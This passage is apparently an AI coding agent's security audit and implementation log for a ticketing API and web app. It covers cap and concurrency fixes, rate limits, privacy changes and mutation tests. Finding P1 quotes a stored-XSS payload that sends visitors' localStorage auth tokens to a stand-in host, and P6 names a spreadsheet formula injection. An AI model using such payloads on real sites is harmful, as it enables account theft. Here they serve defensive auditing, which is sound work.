15. **CT15 — allow-list tests on every organiser and staff response** plus the `pii-mk-7f3a` marker sweep. Rows: G01, G02, S19, I10, ERR01.
16. **CT16 — backward-compatible reserve response** for the no-body call (Android 1.x and the current web client). Rows: Q11, Q12.

Test ratchet: `api/tests/tickets_reserve.rs:108` (`free_ticket_deduped_per_user`) asserts that a second reserve is 409. Change C
changes that behaviour, so its assertion change is recorded as was · now · why and approved by the owner before the merge (rules §5).

## Pre-existing issues found while reading (not fixed here)

| # | Where | Severity | Scenario |
|---|---|---|---|
| P1 | `web/app/components/JsonLd.tsx:3`, `web/lib/seo.ts:12` and `:41`, used on `/`, `/city/[city]`, `/events/[eventId]`; token in `web/lib/api.ts:17-20`; no CSP in `web/next.config.mjs` | CRITICAL | Anyone can publish an event at once. A title `</script><script>fetch('//x/?t='+localStorage.getItem(...))</script>` is emitted raw inside `<script type="application/ld+json">` (`JSON.stringify` does not escape `</script>`), so it runs for every visitor of the home, city and event pages and steals their auth token from `localStorage` |
| P2 | `api/src/events.rs:342-344` and `:380` (`status = COALESCE($14, status)`, no check of the current status) | MAJOR | Admin hides or blocks a reported event (`admin.rs:191`); the organiser sends `PUT /api/events/:id {"status":"published"}` and the event is live again. Same for un-cancelling a cancelled event |
| P3 | `api/src/qr.rs:29-35` (claims carry no owner), `api/src/staff.rs:160-186`, `api/src/tickets.rs:200-229` | MAJOR | U screenshots a fresh QR, transfers (or gifts) the ticket to V, and U or a friend enters within the TTL; V is turned away as `already_used` |
| P4 | `api/src/qr.rs:59-63` (`Validation::new` keeps jsonwebtoken 9.3.1's default `leeway: 60`) | MINOR | A door QR is accepted up to 60 s after its `exp`: 180 s instead of the configured 120 s |
| P5 | `api/src/ratelimit.rs:15-28` | MAJOR | Count then insert without a lock: a parallel burst of N login or code-verify attempts all read the same count and pass, so the 10-per-window brute-force caps do not hold under concurrency |
| P6 | `web/app/organizer/[eventId]/page.tsx:53-61` | MAJOR | The CSV export writes names unquoted and unneutralised: an attendee named `=HYPERLINK(...)` or with a comma or newline injects formulas or shifts columns in the organiser's spreadsheet; it also exports emails |
| P7 | `api/src/users.rs:107-109` with `api/src/emailcode.rs:103`, shown by `api/src/organizer.rs:127` | MAJOR | Email-code sign-up (the MVP's main sign-in) sets the display name to the email local part, so the "name only" guest list shows most of the attendee's email address |
| P8 | `api/src/tickets.rs:334-341` (transfer), `:550-554` (claim), `:494-497` (revoke) against `migrations/0021_free_ticket_dedup.sql:15-17` | MINOR | U reserves, gifts the ticket (`pending_claim`), reserves again, then revokes the gift: the update hits the unique index and returns 500. Same for a transfer or claim to someone who already holds a free ticket for the event |
| P9 | `api/src/eventsocial.rs` (`friends_going` query) with unilateral follows in `api/src/social.rs:76-95` | MAJOR | Any user can follow anyone without approval and then read `GET /api/events/:id/social` to learn whether that person booked a given event (also for hidden and draft events, no status filter) |
| P10 | `api/src/staff.rs:179` and `:195-199` | MINOR | `wrong_event` returns the other event's title, including hidden, draft and blocked events, to staff of an unrelated event |
| P11 | `api/src/staff.rs` and `api/src/routes.rs:88-91` | MAJOR | There is no way to revoke a pending invite or remove a staff member: a leaked invite link, or the wrong person accepting it, keeps scan rights for good |
| P12 | `api/src/auth.rs:119-123` | MINOR | Registration accepts a name of any length (up to the 2 MiB body; `PATCH /api/me` caps at 80), which then fills guest lists, CSV exports and scanner screens |
| P13 | `api/src/ratelimit.rs:25-28`, `migrations/0036_rate_events.sql` | MINOR | `rate_events` is never pruned; every login, verify and (after C and E) reserve and scan adds a row forever |
| P14 | `api/src/tickets.rs:297-301` | MINOR | `transfer_ticket` answers 422 "no user with this email" versus 200, with no rate limit: an account-existence oracle for any email (free tickets make the probe ticket free) |
| P15 | `api/src/gdpr.rs:30-36` | MAJOR | Erasure requires a password; email-code and Google users have `password_hash = NULL`, so `DELETE /api/me` always answers 401 for them and they cannot delete their account |
| P16 | `api/src/gdpr.rs:57-66`; admin block | MINOR | A deleted or blocked account's `active` tickets are never returned: the account can no longer fetch a QR, and the places stay taken |
| P17 | `api/src/events.rs:428-431` with `api/src/staff.rs:30-47` | MINOR | Cancelling an event leaves its tickets `active` and `can_scan` ignores the event status, so tickets of a cancelled event still scan `valid` (row S14 sets the new verdict) |

assumptions: [D1 cap counts active+pending_claim+used, D2 absent/empty/null quantity = 1, D3 recipients count toward the cap, D4 organiser may book own event under the cap, D5 staff get 403 on the guest list, D6 invite stays a bearer token, D7 cancelled/blocked event scans as event_cancelled while hidden/draft still scan, D8 rate-limit defaults 10/h per event, 30/h overall, 120/min scan are proposals not owner numbers, D9 no-op cancel-all = 200 cancelled 0, Change E adds staff list/revoke endpoints, scan response may carry the holder's name]

spec_conflicts: [brief says "cap 5 active tickets" while the owner decision is "5 places per person": counting only status active is bypassable through pending_claim gifts (D1); owner decision "organiser sees only the name" conflicts with email-code accounts whose name defaults to the email local part (P7, G09) and with /social friends_going disclosing attendance to any follower (P9); multi-place booking means the per-user age gate (P1 #77, transfer age check) no longer covers companions (EV13); brief says the door QR lives ~60 s, code default is 120 s plus a 60 s jsonwebtoken leeway (P4); brief assumes staff can be revoked, no revoke exists today (P11); existing test tickets_reserve.rs:108 asserts one free ticket per user and needs an owner-approved assertion change]

## Implementation notes (implementer)

Implemented in `api/` only, commit `26cf5b5` on `claude/underground-mvp` (code, migration 0040, tests). Spec above
accepted as written (D1–D9), with the orchestrator's instructions where they differ (listed under "Readings").
New tests: `api/tests/task302_controls.rs` (34 tests) plus unit tests in `api/src/qr.rs`, `api/src/users.rs`,
`api/src/error.rs`.

### Controls

| Control | Done | Test(s) in `api/tests/task302_controls.rs` unless noted |
|---|---|---|
| CT1 strict optional quantity | yes (`tickets::parse_quantity`, reads raw bytes; `{` check; serde Syntax/Eof → 400, Data → 422) | `ct1_parse_quantity_table`, `ct1_rejected_bodies_book_nothing` |
| CT2 cap 5 under the event row lock | yes (`SELECT … FOR UPDATE` on the event, count over active+pending_claim+used); 0021 index dropped in 0040 | `ct2_cap_of_five_places_per_person`, `ct2_used_and_gifted_places_count`, `ct2_concurrent_bookings_never_exceed_the_cap` |
| CT3 all-or-nothing capacity | yes (one `UPDATE … tickets_left >= $q`, inserts in the same transaction) | `ct2_ct3_five_places_are_five_distinct_tickets`, `ct3_no_partial_fill`, `ct3_last_places_under_concurrency`, `ct3_failure_mid_booking_rolls_back_everything` |
| CT4 recipient cap on transfer and claim | yes (free events; lock order gift → ticket → event) | `ct4_receiving_places_respects_the_recipient_cap`, `ct4_concurrent_claims_into_the_last_place` |
| CT5 cancel-all | **no** — not in the implementation brief; per-ticket `POST /api/tickets/:id/return` is unchanged | — |
| CT6 rate limits + atomic limiter (P5) + prune (P13) + transfer/gift (P14) | yes | `ct6_reserve_is_rate_limited_per_user`, `ct6_scan_is_rate_limited`, `p5_rate_limiter_holds_under_a_parallel_burst`, `p13_rate_events_are_pruned`, `p14_transfer_and_gift_are_rate_limited` |
| CT7 guest list | yes, `GET /api/events/:id/guests` | `ct7_guest_list_counts_people_and_places`, `ct7_guest_list_is_organiser_only` |
| CT8 name fallback "Гість" | yes (generated column `users.name_is_placeholder`; SQL never reads `email`) | `ct8_placeholder_names_are_shown_as_guest`; unit `users::tests::display_name_sql_uses_the_fallback_and_never_the_email` |
| CT9 CSV writer | web side (P6, done in `web/`) | — |
| CT10 QR owner binding + leeway 0 | yes (`oid` claim, required; checked at `/scan` and `/api/tickets/validate`) | `ct10_previous_owner_qr_is_dead`; unit `qr::tests::verify_rejects_just_expired_without_leeway`, `verify_rejects_token_without_owner` |
| CT11 scan hygiene (P10, P17) | yes (both doors) | `ct11_cancelled_or_blocked_event_admits_nobody`, `ct11_wrong_event_reveals_nothing` |
| CT12 staff list / revoke / remove, no self-accept, no invite on cancelled | yes (P11) | `ct12_organiser_lists_revokes_and_removes_staff`, `ct12_organiser_cannot_accept_own_invite`, `ct12_no_invite_for_a_cancelled_event` |
| CT13, CT14 | web side | — |
| CT15 allow-lists + marker sweep | yes | `ct15_no_email_reaches_organiser_or_staff` (+ key checks in `ct7_*`) |
| CT16 old response for body-less clients | yes | `ct16_bodyless_clients_book_one_place_with_the_old_dto` |
| P2 moderation / cancellation stick | yes (`events.admin_locked`, guard inside the UPDATE) | `p2_organiser_cannot_undo_moderation_or_cancellation` |
| P9 mutual friends, published only | yes (both friend lists) | `p9_attendance_is_shown_to_mutual_friends_on_published_events_only` |
| P8 revoke/transfer/claim 500 on the unique index | gone with the index | `ct2_used_and_gifted_places_count` (revoke at the cap) |
| P12 register name ≤ 80 | yes (same byte rule as `PATCH /api/me`) | `p12_register_caps_the_name` |
| P15 password-less self-delete | yes (`{"confirm":"DELETE"}`) | `p15_passwordless_account_can_delete_itself` |
| P16 deletion returns places | yes, free `active` tickets only | `p16_deleting_an_account_returns_its_free_places` |
| Event DTO `tickets_total` | yes (`#[sqlx(default)]`) | `event_dto_carries_tickets_total` |

### Readings and decisions taken while implementing

- CT8 fallback is "Гість" (orchestrator's decision). A name is a placeholder when, trimmed and case-insensitively, it is
  empty, equals the email local part, or equals the whole email. Stored as a generated column, so the guest list,
  per-ticket list, scan response and staff list select `name_is_placeholder`, never `email`.
- Response shapes follow the orchestrator, not rows G01/S19: guest rows are `name, places, checked_in, booked_at`;
  the scan adds `holder_name, places, checked_in` (null when the ticket is not this event's, or for `not_found`,
  `wrong_event`, `event_cancelled`).
- Staff list items carry `user_id` (needed by the remove call) and invites carry `id` (needed by revoke). Invite
  status is `pending`, or `expired` once past `expires_at`; accepted and revoked invites are not listed.
- P2: the orchestrator's "organiser may only move draft↔published" would break the existing test
  `events_manage::hide_event_removes_from_afisha` (organiser hides, then re-publishes) and contradicts the existing
  rule that nothing returns to `draft`. Implemented instead: the organiser may still set `published`/`hidden`, but
  not on a `cancelled` or `blocked` event nor one an admin hid (`admin_locked`, set by `PATCH /api/admin/events/:id`,
  backfilled from `admin_actions` in 0040). Re-sending the current status is a no-op, so other edits still work.
- The recipient cap (CT4) applies to free events only: paid checkout has no per-person cap, so capping only the
  receiving side of a paid ticket would be inconsistent.
- A stale QR (owner changed) answers `not_found`, not a new verdict, so existing clients need no new case. `oid` is
  required: QRs minted before the deploy (≤ 120 s) scan `not_found` until the client refreshes them.
- Invites are also refused on `blocked` events (stricter than I08).
- Rate limits are env-configurable: `RESERVE_LIMIT_PER_EVENT` (10/h), `RESERVE_LIMIT_PER_USER` (30/h),
  `SCAN_LIMIT_PER_EVENT` (120/min), `TRANSFER_LIMIT_PER_USER` (30/h, shared by transfer and gift). Every reserve call
  counts, malformed bodies included (the body is parsed after the limiter).
- P13: each hit prunes its own bucket's rows older than `MAX_WINDOW_SECS` (3600); about 1 in 64 hits prunes the
  whole table (new index on `created_at`).
- P15: password accounts keep the password check; a missing password is 422 (as before, from the extractor).
- P16: only free `active` tickets are returned on deletion; paid ones are a refund decision and are left alone.
  Admin block does not return tickets (a block can be lifted).
- `users::meets_age` is now generic over the executor, so reserve and claim run it on their own transaction instead
  of borrowing a second pool connection while holding the event lock (a burst of bookings could otherwise exhaust
  the pool).

### Existing test assertions changed — owner approval needed before merge (was · now · why)

1. `api/tests/tickets_reserve.rs` `free_ticket_deduped_per_user`: **was** a second reserve by the same user → 409;
   **now** → 201; **why** owner decision: up to 5 places per person per event (Change C).
2. `api/tests/staff.rs` `delegated_staff_scans_then_double_scan_is_used`: **was** `POST /api/staff/accept` → 204;
   **now** → 200 with `{"event_id"}`; **why** orchestrator's Change E contract (the client opens that event's scanner).
3. `api/tests/web_cabinets.rs` `organizer_stats_and_tickets`: **was** `tickets[0]["owner_email"] == "fan@x.co"`;
   **now** `owner_email` is absent; **why** owner decision: the organiser sees only the name, no email (Change E).
4. `api/tests/eventsocial.rs` `social_counts_and_friends`: **was** a one-sided follow made the followee a "friend";
   **now** the test adds the follow-backs (assertions unchanged); **why** P9: attendance is shown to mutual follows
   only.

Items 2–4 were not in the brief's list of known assertion changes; they follow directly from behaviour the brief
ordered, so they are listed here rather than left red.

### Detection power (mutation)

Each mutation was applied by a script that kept the original bytes, restored them in `finally` and compared SHA-256;
`git diff --stat -- api` was empty before and after. Only the named test was run; every red below is an assertion
failure, not a compile error.

| Control → mutation | Test | Red when removed |
|---|---|---|
| CT1 → object check `starts_with('{')` disabled | `ct1_parse_quantity_table` (`"[2]" must be rejected, got quantity 2`) | yes |
| CT2 → `FOR UPDATE` removed from the reserve event lock | `ct2_concurrent_bookings_never_exceed_the_cap` (six parallel reserve(1) gave `(6, 0)`, not `(5, 1)`) | yes |
| CT3 → `tickets_left >= $q` weakened to `> 0` | `ct3_no_partial_fill`, `ct3_last_places_under_concurrency` (500 instead of 409; the DB `CHECK (tickets_left >= 0)` is the only thing left) | yes |
| CT4 → recipient-cap call removed from claim | `ct4_receiving_places_respects_the_recipient_cap` (claim at 5 → 200), `ct4_concurrent_claims_into_the_last_place` (`[200, 200]`) | yes |
| CT8 → display name replaced by raw `u.name` | `ct8_placeholder_names_are_shown_as_guest` (local parts and the whole email listed) | yes |
| CT10 → owner filter at `/scan` replaced by `true` | `ct10_previous_owner_qr_is_dead` (old owner's QR scanned `valid`) | yes |
| P5 → advisory lock removed from `ratelimit::hit` | `p5_rate_limiter_holds_under_a_parallel_burst` (12 of 20 passed a limit of 10) | yes |

### Rows not covered by a new test (and why)

- X06–X09, C12, the cancel-all half of X11 and K06: CT5 (cancel-all) is not built.
- C06 (two JWTs): the cap is keyed on the user id from the database; no separate test.
- T04, T06, S11: rely on the same event lock / existing `FOR UPDATE` and existing gift-expiry tests; no new test.
- RL08 (`idle in transaction` after 1 000 rejects): not tested; every early return drops the transaction.
- Concurrent rows run 5–8 rounds each, not 50 (suite time).
- Q18/S17 (413), EV01–EV15, X01–X05, I01–I05, I09, I14, I15, H01: existing controls and existing tests; unchanged.
- G02's CSV part, G10, G11, I13, W01–W05: web client.
- EV13 and RL06 remain stated limits (companions' age; one person with several accounts).

### Local test environment

`cargo test --locked --no-fail-fast` against a fresh scratch database: 324 passed, 1 failed. The failure is
`notifications::city_match_is_case_insensitive_and_eventless_city_matches_all`, and it fails identically at the base
commit `e5b24ec`: the local Postgres 14 runs with `lc_ctype = C`, where `lower('КИЇВ') = lower('київ')` is false. CI's
`postgres:16-alpine` folds Cyrillic case. The shared local `postgres` database also carries migrations 40–42 from
another branch, which makes `db_connect::connect_runs_migrations_and_queries` fail there with any new migration 40;
it passes on a fresh database.

## Fix batch 1

From the two independent reviews (API + web). Implementer: the same identity as above. Tests in
`api/tests/task302_fix1.rs` unless noted.

| # | Item | Done | Test(s) | Mutation-proven |
|---|---|---|---|---|
| 1 | Password-less sign-up stores "Гість", never the email local part; 0048 resets existing auto-named password-less accounts; the CT8 display fallback stays | yes | `item1_email_code_account_never_shows_its_local_part` (profile, reviews, conversations, gift preview, event social, staff list), `item1_item5_migration_backfill_is_idempotent` | yes |
| 2 | P15 step-up: password-less `DELETE /api/me` needs a token issued ≤ 10 min ago, else 401 "увійдіть ще раз…" (new `AppError::ReauthRequired`; `CurrentUser` now carries `iat`) | yes | `item2_passwordless_delete_needs_a_recent_login` | yes |
| 3 | Register: email uniqueness checked before argon2; per-IP limit (rightmost `X-Forwarded-For`, else socket peer; `SIGNUP_LIMIT_PER_IP`, 10/h) shared with `POST /api/auth/email/request-code`; per-email limit (`REGISTER_LIMIT_PER_EMAIL`, 5/h); `main` serves with connect info | yes | `item3_register_is_rate_limited_per_ip_and_per_email`, `item3_taken_email_is_refused_before_hashing`; unit `ratelimit::tests::client_ip_*` | yes (both the per-IP limit and the check before hashing) |
| 4 | P16: deletion revokes the user's pending gifts and returns `active` + `pending_claim` tickets, filtered by `events.cost_type = 'free'` | yes | `item4_delete_returns_gifted_places_and_revokes_gifts` | no |
| 5 | Migration renumbered 0040 → 0048, idempotent (IF [NOT] EXISTS, guarded UPDATEs) | yes | `item1_item5_migration_backfill_is_idempotent` (runs 0048 twice more) | no |
| 6 | Concurrency: one QR at `/scan` and `/validate` at once; reserve + claim by one user at the cap | yes (no code change needed) | `item6_same_qr_at_both_doors_admits_once`, `item6_concurrent_reserve_and_claim_respect_the_cap` | no |
| 7 | At most 20 live (pending, unexpired) invites per event, under the event row lock; list limit raised to 200 | yes | `item7_pending_invites_are_capped_at_twenty` (25 parallel → 20) | yes |
| 8 | Stale comments in `tickets_reserve.rs::free_ticket_deduped_per_user` | yes, comments only | — | — |
| 9 | Global `ratelimit::prune` runs in `tokio::spawn` | yes | `task302_controls::p13_rate_events_are_pruned` | — |
| 10 | `GET /api/events/:id/social` → 404 unless published | yes | `item10_social_is_404_unless_published` | no |
| 11a | Ticket DTO `event_ends_at` (`#[sqlx(default)]`) | yes | `item11a_ticket_carries_event_ends_at` | — |
| 11b | `links`, `video_url`, `gallery_urls`, `poster_url`: only absolute `http(s)://` with a host (poster/gallery also `/uploads/…` without `..` or `//`); empty string allowed; else 422, on create and update | yes (`events::is_safe_url`) | `item11b_url_rule`, `item11b_event_urls_must_be_http` | yes |
| 11c | Free-only mode: create coerces `cost_type` → free and `price` → 0; update coerces a sent `price` → 0 | yes | `item11c_free_only_mode_coerces_paid_events` | no |
| 12 | Transfer 409 "recipient already holds 5" reveals that a known email holds places at that event | accepted for the MVP (MINOR); recorded only | — | — |

Readings:
- Free-only mode is a process-wide switch set by `main` from `FREE_EVENTS_ONLY` (on unless exactly "0"). In-process
  tests never call `main`, so the existing paid-flow tests keep running with it off; the item 11c test turns it on.
  `UpdateEventReq` has no `cost_type`, so an update can only change the price, and a sent price becomes 0. Existing paid
  events are not converted.
- Item 3: requests with no `X-Forwarded-For` and no connect info (in-process tests only) share one `"unknown"` bucket.
  Behind NAT (a venue Wi-Fi), 10 sign-ups and code requests per hour per IP is tight; raise `SIGNUP_LIMIT_PER_IP` if
  it bites.
- Item 1 backfill renames only password-less accounts whose name equals the email local part. A password account that
  typed its local part as its name keeps it; the CT8 fallback still hides it from organisers and staff.
- Item 4: the sender's gifts are revoked, and the gifted places go back on sale. Paid tickets and gifts are untouched.

Changed assertion in a test written in this task: `task302_controls.rs::p9_attendance_is_shown_to_mutual_friends_on_published_events_only`.
Was: a hidden event answers 200 with empty friend lists. Now: 404. Why: item 10.

### Fix batch 1 mutation proofs

Same procedure as above: a script kept the original bytes, restored them in `finally` and compared SHA-256. The diff
stat was identical before and after. Each red below is an assertion failure.

| Control → mutation | Test | Red when removed |
|---|---|---|
| 1 → `create_passwordless_user` names the account after the local part again | `item1_email_code_account_never_shows_its_local_part` (name was `loc.part.x7q`) | yes |
| 2 → step-up check disabled | `item2_passwordless_delete_needs_a_recent_login` (11-minute-old token erased: 204) | yes |
| 3 → per-IP sign-up limit removed from register | `item3_register_is_rate_limited_per_ip_and_per_email` (11th sign-up: 201) | yes |
| 3 → uniqueness check before argon2 disabled | `item3_taken_email_is_refused_before_hashing` (300 ms per 409 vs 322 ms per sign-up) | yes |
| 7 → event row lock removed from invite creation | `item7_pending_invites_are_capped_at_twenty` (21 of 25 created) | yes |
| 11b → URL check always passes | `item11b_event_urls_must_be_http` (`javascript:` link stored: 201) | yes |

## Fix batch 2

From the closure check of fix batch 1. Tests in `api/tests/task302_fix1.rs` unless noted.

| # | Item | Done | Test(s) | Mutation-proven |
|---|---|---|---|---|
| N1 | End after start, on create and on the RESULT of an update (new or kept start vs new, kept or cleared end); `UpdateEventReq.clear_ends_at` | yes | `n1_end_must_follow_start_and_can_be_cleared` | yes (update check removed → the start moved past the kept end: 200) |
| N3 | `GiftPreview.event_timezone` (`#[sqlx(default)]`) | yes | `n3_gift_preview_has_event_timezone` | — |
| N4 | Email-code request: own per-IP bucket `code-ip:{ip}`, `CODE_LIMIT_PER_IP` (default 60/h), no exemption for existing emails; per-email soft cap unchanged; register keeps `signup-ip` (10/h) | yes | `n4_code_requests_have_their_own_ip_bucket`, `item3_register_is_rate_limited_per_ip_and_per_email` | no |
| N5 | `/uploads/…` paths reject any `%` | yes | `item11b_url_rule` (`%2e%2e`, `.%2e`, `%2E%2E`, `%2f`) | yes (`%2e%2e` accepted) |
| N6 | Gift creation never looks at the recipient (as before); the cap is enforced at claim, with a 409 to the claimer. A direct transfer refused for the recipient cap gives the same 422 and text as an unknown email (`tickets::TRANSFER_REFUSED`); the cap guarantee is unchanged | yes | `task302_controls::ct4_receiving_places_respects_the_recipient_cap`, `n6_gift_reveals_nothing_and_the_cap_holds_at_claim` | yes (cap refusal back to its own 409) |
| N7 | none (dev never ran 26cf5b5) | — | — | — |

Contract:
- `PUT /api/events/:id` accepts `"clear_ends_at": true`, which sets `ends_at` to null. A null or absent `ends_at` still
  keeps the current value. `clear_ends_at` together with an `ends_at` value → 422. Any create or update whose
  resulting `ends_at` is not later than its resulting `starts_at` → 422 "час завершення має бути пізніше за час
  початку". If either value is null, there is no check.
- `POST /api/tickets/:id/transfer`: an unknown email and a recipient already holding 5 places both answer
  422 `{"error":"не вдалося передати квиток на цей email — надішліть його подарунком"}`. The
  recipient-age refusal stays 409 (pre-existing behaviour and an existing test, `age_gating.rs`). It still reveals that
  the recipient is under the age rating or has no birth date. Folding it into the same 422 would change an existing
  assertion, so that needs the owner's word.
- `POST /api/tickets/:id/gift` → 201 whatever the recipient holds. `POST /api/tickets/claim` at the cap → 409 to the
  claimer; the gift stays pending.

The N1 update check reads the current times before the UPDATE without a lock. Two concurrent edits by the same
organiser could still combine into an end before the start. That outcome is visible to the organiser at once.

Changed assertions in tests written in this task:
- `task302_controls::ct4_receiving_places_respects_the_recipient_cap`. Was: transfer to a full recipient → 409.
  Now: 422 with the same body as an unknown email. Why: N6.
- `task302_fix1::item3_register_is_rate_limited_per_ip_and_per_email`. Was: after 10 sign-ups from an IP, a code
  request from it → 429. Now: 204. Why: N4.
